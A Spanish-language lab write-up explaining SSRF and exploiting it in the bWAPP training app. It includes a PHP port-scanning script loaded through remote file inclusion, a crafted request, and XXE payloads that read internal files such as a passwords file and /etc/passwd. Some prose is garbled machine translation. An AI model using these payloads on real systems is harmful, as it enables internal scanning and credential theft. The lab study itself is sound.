# SSRF (Server Side Request Forgery)

###### tags: `VULNWEB TERMINADO`


## ¿QUE ES SSRF?
Esta vulnerabilidad ocurre cuando una aplicación web permite hacer consultas HTTP del lado del servidor hacia un dominio arbitrario elegido por el atacante.

Esto le permite a un atacante hacer conexión con servicios de la infraestructura interna donde se aloja la web y exfiltrar información sensible.

El punto popular, SSRF (Server Side Request Forgery), es decir, la solicitud del servidor para falsificación, es un atacante que puede vulnerabilidad a través de vulnerabilidades del servidor, enviar una solicitud cuidadosamente construida al servidor como servidor (el objetivo al que ataca generalmente es un interno red a la que no se puede acceder directamente desde la red externa), y un atacante puede realizar varias operaciones no autorizadas utilizando el acceso al servidor de destino.

![](https://i.imgur.com/TTX5qiF.png)


## TIPOS

* SSRF básica

Es decir, un atacante puede recibir una respuesta a la SSRF construida, un atacante puede usar esta vulnerabilidad para realizar operaciones de lectura y escritura.

* SSRF ciego
 
 Debido a que la vulnerabilidad BLIND SSRF no devuelve la respuesta a un atacante, no es posible leer las operaciones para el atacante, pero la operación de lectura se puede realizar fácilmente y el atacante no necesita ver la respuesta.


## CASO PRÁCTICO BWAPP


![](https://i.imgur.com/SOaEQgE.png)

Nos dice lo siguiente:

  1. Utilice RFI para escanear puertos.

  2. Utilice XXE para acceder a los recursos de la red interna.

  3. Usar XXE para bloquear mi Samsung SmartTV (CVE-2013-4890)

**UTILIZAMOS RFI PARA ESCANEAR PUERTOS**

![](https://i.imgur.com/lzfvm8n.png)


```php
<?php>
echo "<script>alert(\"U 4r3 0wn3d by MME!!!\");</script>";// función de salida de eco


if(isset($_REQUEST["ip"]))// Determinar si se envía ip
{
    
    //list of port numbers to scan
    $ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306);// Enumere algunos puertos que deben escanearse
    
    $results = array();
    
    foreach($ports as $port)// Atraviesa la matriz
    {


        if($pf = @fsockopen($_REQUEST["ip"], $port, $err, $err_string, 1))// función fsockopen para establecer una conexión, escaneo de puertos
        {


            $results[$port] = true;
            fclose($pf);
            
        }
        
        else
        {


            $results[$port] = false;        


        }


    }
    foreach($results as $port=>$val)
    {


        $prot = getservbyport($port,"tcp");// Devuelve la información de servicio relacionada con el número de puerto y el nombre de protocolo dados
        echo "Port $port ($prot): ";


        if($val)
        {


            echo "<span style=\"color:green\">OK</span><br/>";


        }


        else
        {


            echo "<span style=\"color:red\">Inaccessible</span><br/>";

        }

    }

}
?>
```


![](https://i.imgur.com/VhIFo8X.png)

Al pulsar en el boton "go" vemos que la URL es  http://192.168.0.9/bWAPP/rlfi.php?language=lang_en.php&action=go
es una vulnerabilidad la cual usandola junto a SSRF, podemos construir un script de escaneo de puertos para hacer que el servidor inicie una solicitud.

Con burpsuite interceptando y a traves del metodo get request

```
GET /bwapp/rfli.php?language=http://192.168.0.9/evil/ssrf-1.txt&action=go&tip=192.168.0.9 HTTP/1.1
HOST: 192.168.0.9
```
![](https://i.imgur.com/aMclzSs.png)






**Utilice XXE para acceder a recursos en la red interna**

El segundo enlace contiene este archivo

```xml
#Accesses a file on the internal network (1)

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">
]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>


#Accesses a file on the internal network (2)
#Web pages returns some characters that break the XML schema > use the PHP base64 encoder filter to return an XML schema friendly version of the page!

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml">
]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>

```

Revisamos el robots.txt

![](https://i.imgur.com/TL3NSbh.png)


Pero vemos que dentro de /passwords hay /bWAPP/passwords/heroes.xml.


![](https://i.imgur.com/062D6J3.png)

de esta misma forma podemos sacar /etc/passwd

![](https://i.imgur.com/3bnApPl.png)


![](https://i.imgur.com/TrUj0YX.png)





